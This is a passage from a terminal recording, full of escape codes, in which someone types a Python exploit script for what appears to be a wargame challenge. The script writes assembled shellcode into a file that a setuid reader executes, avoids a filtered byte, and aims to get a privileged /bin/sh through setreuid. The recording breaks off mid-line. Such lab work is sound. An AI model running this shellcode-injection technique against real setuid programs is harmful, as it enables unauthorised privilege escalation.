[0.000, "o", "5l# \"HelloKitty\"; on success it setreuid(euid,euid) and execl(\"/bin/sh\").\u001b[5;1H\u001b[K\u001b[32;83H5\u001b[5;1H\u001b[?25h\u001b[?25l# The reader mmaps shellcode.txt with PROT_READ|WRITE|EXEC and calls it, so our\u001b[6;1H\u001b[K\u001b[32;83H6\u001b[6;1H\u001b[?25h\u001b[?25l# shellcode must write \"HelloKitty\" to stdout. The reader refuses any file that\u001b[7;1H\u001b[K\u001b[32;83H7\u001b[7;1H\u001b[?25h\u001b[?25l# contains byte 0x0b (vertical tab).\u001b[8;1H\u001b[K\u001b[32;83H8\u001b[8;1H\u001b[?25h\u001b[?25l#\u001b[9;1H\u001b[K\u001b[32;83H9\u001b[9;1H\u001b[?25h\u001b[?25l# The shellcode is not hand-typed here: it was written in /tmp/b6.asm and\u001b[10;1H\u001b[K\u001b[32;83H10,1\u001b[10;1H\u001b[?25h\u001b[?25l# assembled with nasm (nasm -f elf32 /tmp/b6.asm -o /tmp/b6.o;\u001b[11;1H\u001b[K\u001b[32;84H1\u001b[11;1H\u001b[?25h\u001b[?25l# objcopy -O binary --only-section=.text /tmp/b6.o /tmp/b6.bin).\u001b[12;1H\u001b[K\u001b[32;84H2\u001b[12;1H\u001b[?25h\u001b[?25lsc = open(\"/tmp/b6.bin\", \"rb\").read()\u001b[13;1H\u001b[K\u001b[32;84H3\u001b[13;1H\u001b[?25h\u001b[?25lprint(\"shellcode (%d bytes): %s\" % (len(sc), sc.hex()), flush=True)\u001b[14;1H\u001b[K\u001b[32;84H4\u001b[14;1H\u001b[?25h\u001b[?25lassert b\"\\x0b\" not in sc, \"the reader refuses any file containing 0x0b\"\u001b[15;1H\u001b[K\u001b[32;84H5\u001b[15;1H\u001b[?25h\u001b[?25l\u001b[16;1H\u001b[K\u001b[32;84H6\u001b[16;1H\u001b[?25h\u001b[?25lwork = \"/tmp/b6work\"\u001b[17;1H\u001b[K\u001b[32;84H7\u001b[17;1H\u001b[?25h\u001b[?25los.makedirs(work, exist_ok=True)\u001b[18;1H\u001b[K\u001b[32;84H8\u001b[18;1H\u001b[?25h\u001b[?25los.chmod(work, 0o777)\u001b[19;1H\u001b[K\u001b[32;84H9\u001b[19;1H\u001b[?25h\u001b[?25los.chdir(work)\u001b[20;1H\u001b[K\u001b[32;83H20\u001b[20;1H\u001b[?25h\u001b[?25lopen(\"shellcode.txt\", \"wb\").write(sc)\u001b[21;1H\u001b[K\u001b[32;84H1\u001b[21;1H\u001b[?25h\u001b[?25lprint(\"wrote %s/shellcode.txt (%d bytes)\" % (